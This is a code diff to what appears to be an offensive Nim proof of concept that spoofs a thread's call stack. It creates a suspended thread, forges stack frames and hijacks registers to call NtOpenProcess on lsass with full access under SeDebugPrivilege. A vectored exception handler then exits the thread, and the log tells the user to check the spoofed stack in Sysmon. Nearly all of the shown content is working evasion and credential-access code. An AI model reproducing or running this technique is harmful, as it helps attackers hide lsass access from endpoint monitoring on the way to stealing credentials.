@@ -20,7 +20,7 @@ proc PrintBanner():void =
 ██║ ╚████║██║██║ ╚═╝ ██║██║╚██████╗███████║   ██║   ██║  ██║╚██████╗██║  ██╗
 ╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝╚═╝ ╚═════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                                                             
-                                @R0h1rr1m                                       
+                              @R0h1rr1m                                       
 """
     echo banner
 
@@ -206,56 +206,39 @@ proc DummyFunction(lpParam:LPVOID):DWORD {.stdcall.}=
     return 0
 
 proc PushtoStack(value:ULONG64):void =
-    when winimCpu64:
-        context.Rsp = cast[ULONG64](cast[uint64](context.Rsp)-0x8)
-        var AddressToWrite:PULONG64 = cast[PULONG64](context.Rsp)
-        AddressToWrite[] = value
-    when winimCpu32:
-        context.Esp = cast[ULONG32](cast[uint32](context.Esp)-0x4)
-        var AddressToWrite:PULONG32 = cast[PULONG32](context.Esp)
-        AddressToWrite[] = value
+    context.Rsp = cast[ULONG64](cast[uint64](context.Rsp)-0x8)
+    var AddressToWrite:PULONG64 = cast[PULONG64](context.Rsp)
+    AddressToWrite[] = value
 
 proc InitializeFakeThreadStack():void = 
-    when winimCpu64:
-        var childSp:ULONG64 = 0
-        var bPreviousFrameSetUWOP_SET_FPREG:bool = false
-        # Set last return address to 0 --> Stack is already initialized because of the suspended threat
-        PushToStack(0)
-        for i in countdown(selectedStackFrame.len - 1 ,0):
-            if(bPreviousFrameSetUWOP_SET_FPREG and selectedStackFrame[i].pushRbp):
-                var diff = selectedStackFrame[i].countOfCodes - selectedStackFrame[i].pushRbpIndex
-                var tmpStackSizeCounter:int = 0
-                for j in countup(0,diff-1):
-                    # Push rbx
-                    PushToStack(0x0)
-                    tmpStackSizeCounter+=0x8
-                # Push rbp
-                PushToStack(childSp)
-                # Minus off the remaining function stack size and continue unwinding.
-                context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize - cast[uint64]((tmpStackSizeCounter + 0x8)))
-                var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
-                fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
-                bPreviousFrameSetUWOP_SET_FPREG = false
-            else:
-                # If normal frame, decrement total stack size and write RET address
-                context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize)
-                var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
-                fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
-            if(selectedStackFrame[i].setsFramePointer):
-                childSp = context.Rsp
-                childSp += 0x8
-                bPreviousFrameSetUWOP_SET_FPREG = true
-    when winimCpu32:
-        PushtoStack(0)
-        for i in countdown(selectedStackFrame.len - 1 ,0):
-            # Push old ebp
-            PushtoStack(context.Ebp)
-            # Mov ebp,esp
-            context.Ebp = context.Esp
-            # push the return address
-            PushtoStack(selectedStackFrame[i].returnAddress)
-            # we have to consider the last case 
-
+    var childSp:ULONG64 = 0
+    var bPreviousFrameSetUWOP_SET_FPREG:bool = false
+    # Set last return address to 0 --> Stack is already initialized because of the suspended threat
+    PushToStack(0)
+    for i in countdown(selectedStackFrame.len - 1 ,0):
+        if(bPreviousFrameSetUWOP_SET_FPREG and selectedStackFrame[i].pushRbp):
+            var diff = selectedStackFrame[i].countOfCodes - selectedStackFrame[i].pushRbpIndex
+            var tmpStackSizeCounter:int = 0
+            for j in countup(0,diff-1):
+                # Push rbx
+                PushToStack(0x0)
+                tmpStackSizeCounter+=0x8
+            # Push rbp
+            PushToStack(childSp)
+            # Minus off the remaining function stack size and continue unwinding.
+            context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize - cast[uint64]((tmpStackSizeCounter + 0x8)))
+            var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
+            fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
+            bPreviousFrameSetUWOP_SET_FPREG = false
+        else:
+            # If normal frame, decrement total stack size and write RET address
+            context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize)
+            var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
+            fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
+        if(selectedStackFrame[i].setsFramePointer):
+            childSp = context.Rsp
+            childSp += 0x8
+            bPreviousFrameSetUWOP_SET_FPREG = true
 
 proc GetLsassPid():DWORD = 
     var processEntry:PROCESSENTRY32A
@@ -274,8 +257,8 @@ proc VehCallback(exceptionInfo:PEXCEPTION_POINTERS):LONG {.stdcall.} =
     if(exceptionCode != STATUS_ACCESS_VIOLATION):
         return EXCEPTION_CONTINUE_SEARCH
     if(exceptionCode == STATUS_ACCESS_VIOLATION):
-        echo "[+] Veh is called!"
-        echo "[+] Redirecting thread to RtlExitUserThread"
+        echo "[+] VEH callback was called!"
+        echo "[+] Redirecting thread to RtlExitUserThread..."
         exceptionInfo.ContextRecord.Rip = cast[DWORD64](GetProcAddress(GetModuleHandleA("ntdll"),"RtlExitUserThread"))
         exceptionInfo.ContextRecord.Rcx = 0
         return EXCEPTION_CONTINUE_EXECUTION
@@ -293,17 +276,22 @@ when isMainModule:
     if(paramCount() != 1):
         DisplayHelp()
         quit(-1)
+    # Save the mimiced frame
     if(not SetSelectedFrame(paramStr(1))):
         echo "[!] Invalid call stack option is selected! [",paramStr(1),"]"
         quit(-1)
     echo "[+] ",paramStr(1)[2..paramStr(1).len-1], " frame is selected!"
+    # Load required libraries for return addresses
     if(not PrepareRequiredLibraries()):
         echo "[!] Error on stack frame preparation!"
         quit(-1)
+    echo "[+] Required libraries were imported for return address calculation!"
     # Needs debug privileges for lsass access poc
     if(not ArrangeSePrivilege(SE_DEBUG_NAME,true)):
         echo "[!] Error on enabling SeDebugPrivilege (Run the program as admin)!"
         quit(-1)
+    echo "[+] SeDebugPrivilege is enabled!"
+    # Create a thread for using the mimiced call stack
     hThread = CreateThread(NULL,MAX_STACK_SIZE,DummyFunction,cast[LPVOID](0),CREATE_SUSPENDED,addr dwThreadId)
     if (0 == hThread):
         echo "[!] Failed to create suspended thread"
@@ -312,7 +300,10 @@ when isMainModule:
     if(FALSE == GetThreadContext(hThread, addr context)):
         echo "[!] Error on GetThreadContext!"
         quit(-1)
+    # Create the stack
     InitializeFakeThreadStack()
+    echo "[+] Fake Call Stack was created!"
+    # Arrange the registers of suspended thread for the NtOpenProcess call
     context.Rcx = cast[DWORD64](addr hLsass)
     context.Rdx = cast[DWORD64](PROCESS_ALL_ACCESS)
     objectAttr.Length = cast[ULONG](sizeof(OBJECT_ATTRIBUTES))
@@ -330,12 +321,18 @@ when isMainModule:
     clientID.UniqueThread = 0
     context.R9 = cast[DWORD64](addr clientID)
     context.Rip = cast[DWORD64](GetProcAddress(GetModuleHandle("ntdll"),"NtOpenProcess"))
+    # Set the registers
     if(SetThreadContext(hThread,addr context) == FALSE):
         echo "[!] Failed to set thread context!"
         quit(-1)
+    echo "[+] Registers were set for NtOpenProcess call!"
+    # Add VEH for returning
     if(cast[uint64](AddVectoredExceptionHandler(1,cast[PVECTORED_EXCEPTION_HANDLER](VehCallback))) == 0):
         echo "[!] Failed to add vectored exception handler!"
         quit(-1)
+    # Resume the suspended thread
+    echo "[+] VEH callback was set for the suspended thread!"
+    echo "[+] Thread is resuming..."
     if(ResumeThread(hThread) == -1):
         echo "[!] Failed to resume suspended thread!"
         quit(-1)
@@ -346,4 +343,4 @@ when isMainModule:
         quit(-1)
     else:
         echo "[+] Spoof is successful! Handle is ",hLsass
-        echo "[+] You can check the call stack from Sysmon!"
+        echo "[+] You can check the spoofed call stack from Sysmon!"
